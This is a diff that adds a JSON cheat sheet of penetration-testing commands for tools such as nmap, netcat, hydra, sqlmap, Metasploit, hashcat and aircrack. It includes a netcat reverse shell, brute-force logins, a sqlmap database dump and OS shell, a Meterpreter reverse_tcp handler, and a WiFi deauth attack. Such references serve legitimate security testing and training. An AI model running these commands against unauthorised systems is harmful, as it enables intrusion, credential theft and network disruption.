@@ -1,0 +1,276 @@
+{
+  "nmap": [
+    {
+      "command": "nmap -sS target",
+      "description": "TCP SYN scan (stealth scan)"
+    },
+    {
+      "command": "nmap -sV target",
+      "description": "Version detection scan"
+    },
+    {
+      "command": "nmap -O target",
+      "description": "OS detection scan"
+    },
+    {
+      "command": "nmap -A target",
+      "description": "Aggressive scan (OS, version, script, traceroute)"
+    },
+    {
+      "command": "nmap -p- target",
+      "description": "Scan all ports (1-65535)"
+    },
+    {
+      "command": "nmap -sU target",
+      "description": "UDP scan"
+    },
+    {
+      "command": "nmap -sn 192.168.1.0/24",
+      "description": "Ping scan (host discovery)"
+    },
+    {
+      "command": "nmap -p 80,443 target",
+      "description": "Scan specific ports"
+    },
+    {
+      "command": "nmap --script vuln target",
+      "description": "Run vulnerability scripts"
+    },
+    {
+      "command": "nmap -T4 -F target",
+      "description": "Fast scan with timing template"
+    }
+  ],
+  "netcat": [
+    {
+      "command": "nc -lvp 4444",
+      "description": "Listen on port 4444"
+    },
+    {
+      "command": "nc target 80",
+      "description": "Connect to target on port 80"
+    },
+    {
+      "command": "nc -e /bin/bash target 4444",
+      "description": "Reverse shell to target"
+    },
+    {
+      "command": "nc -u target 53",
+      "description": "UDP connection"
+    },
+    {
+      "command": "nc -zv target 1-1000",
+      "description": "Port scan with verbose output"
+    },
+    {
+      "command": "nc -w 3 target 22",
+      "description": "Connection with 3 second timeout"
+    }
+  ],
+  "hydra": [
+    {
+      "command": "hydra -l admin -P passwords.txt ssh://target",
+      "description": "SSH brute force with username admin"
+    },
+    {
+      "command": "hydra -L users.txt -P passwords.txt target http-post-form",
+      "description": "HTTP POST form brute force"
+    },
+    {
+      "command": "hydra -l admin -P passwords.txt target ftp",
+      "description": "FTP brute force attack"
+    },
+    {
+      "command": "hydra -L users.txt -P passwords.txt target smb",
+      "description": "SMB brute force attack"
+    },
+    {
+      "command": "hydra -l admin -x 6:8:a target ssh",
+      "description": "SSH brute force with generated passwords"
+    }
+  ],
+  "sqlmap": [
+    {
+      "command": "sqlmap -u 'http://target/page.php?id=1'",
+      "description": "Basic SQL injection test"
+    },
+    {
+      "command": "sqlmap -u 'http://target/page.php?id=1' --dbs",
+      "description": "Enumerate databases"
+    },
+    {
+      "command": "sqlmap -u 'http://target/page.php?id=1' --dump",
+      "description": "Dump database contents"
+    },
+    {
+      "command": "sqlmap -u 'http://target/page.php?id=1' --os-shell",
+      "description": "Get OS shell through SQL injection"
+    },
+    {
+      "command": "sqlmap -r request.txt",
+      "description": "Test from saved HTTP request file"
+    },
+    {
+      "command": "sqlmap -u 'target' --crawl=3",
+      "description": "Crawl website and test forms"
+    }
+  ],
+  "gobuster": [
+    {
+      "command": "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
+      "description": "Directory brute force"
+    },
+    {
+      "command": "gobuster dns -d target -w /usr/share/wordlists/subdomains.txt",
+      "description": "Subdomain enumeration"
+    },
+    {
+      "command": "gobuster dir -u http://target -w wordlist.txt -x php,html,txt",
+      "description": "Directory brute force with file extensions"
+    },
+    {
+      "command": "gobuster vhost -u http://target -w wordlist.txt",
+      "description": "Virtual host brute force"
+    }
+  ],
+  "metasploit": [
+    {
+      "command": "msfconsole",
+      "description": "Start Metasploit console"
+    },
+    {
+      "command": "search exploit/windows/smb",
+      "description": "Search for SMB exploits"
+    },
+    {
+      "command": "use exploit/multi/handler",
+      "description": "Use multi handler for reverse shells"
+    },
+    {
+      "command": "set PAYLOAD windows/meterpreter/reverse_tcp",
+      "description": "Set Windows reverse TCP payload"
+    },
+    {
+      "command": "set LHOST 192.168.1.100",
+      "description": "Set local host for reverse connection"
+    },
+    {
+      "command": "exploit",
+      "description": "Run the exploit"
+    },
+    {
+      "command": "sessions -l",
+      "description": "List active sessions"
+    }
+  ],
+  "john": [
+    {
+      "command": "john --wordlist=rockyou.txt hashes.txt",
+      "description": "Password cracking with wordlist"
+    },
+    {
+      "command": "john --incremental hashes.txt",
+      "description": "Incremental password cracking"
+    },
+    {
+      "command": "john --show hashes.txt",
+      "description": "Show cracked passwords"
+    },
+    {
+      "command": "john --format=NT hashes.txt",
+      "description": "Crack NTLM hashes"
+    }
+  ],
+  "hashcat": [
+    {
+      "command": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
+      "description": "MD5 dictionary attack"
+    },
+    {
+      "command": "hashcat -m 1000 -a 0 hashes.txt rockyou.txt",
+      "description": "NTLM dictionary attack"
+    },
+    {
+      "command": "hashcat -m 0 -a 3 hashes.txt ?d?d?d?d",
+      "description": "MD5 brute force 4 digits"
+    },
+    {
+      "command": "hashcat --show hashes.txt",
+      "description": "Show cracked hashes"
+    }
+  ],
+  "nikto": [
+    {
+      "command": "nikto -h http://target",
+      "description": "Basic web vulnerability scan"
+    },
+    {
+      "command": "nikto -h http://target -p 80,443,8080",
+      "description": "Scan specific ports"
+    },
+    {
+      "command": "nikto -h http://target -C all",
+      "description": "Scan with all available plugins"
+    }
+  ],
+  "burpsuite": [
+    {
+      "command": "burpsuite",
+      "description": "Start Burp Suite"
+    },
+    {
+      "command": "java -jar burpsuite_community.jar",
+      "description": "Start Burp Suite Community"
+    }
+  ],
+  "aircrack": [
+    {
+      "command": "airmon-ng start wlan0",
+      "description": "Enable monitor mode on wireless interface"
+    },
+    {
+      "command": "airodump-ng wlan0mon",
+      "description": "Scan for wireless networks"
+    },
+    {
+      "command": "airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon",
+      "description": "Capture packets from specific network"
+    },
+    {
+      "command": "aireplay-ng -0 10 -a [BSSID] wlan0mon",
+      "description": "Deauth attack (10 packets)"
+    },
+    {
+      "command": "aircrack-ng -w wordlist.txt capture.cap",
+      "description": "Crack WPA/WPA2 with wordlist"
+    }
+  ],
+  "enum4linux": [
+    {
+      "command": "enum4linux target",
+      "description": "Enumerate SMB shares and users"
+    },
+    {
+      "command": "enum4linux -a target",
+      "description": "All enumeration options"
+    },
+    {
+      "command": "enum4linux -U target",
+      "description": "Enumerate users only"
+    }
+  ],
+  "smbclient": [
+    {
+      "command": "smbclient -L //target",
+      "description": "List SMB shares"
+    },
+    {
+      "command": "smbclient //target/share",
+      "description": "Connect to SMB share"
+    },
+    {
+      "command": "smbclient //target/share -U username",
+      "description": "Connect with specific username"
+    }
+  ]
+}
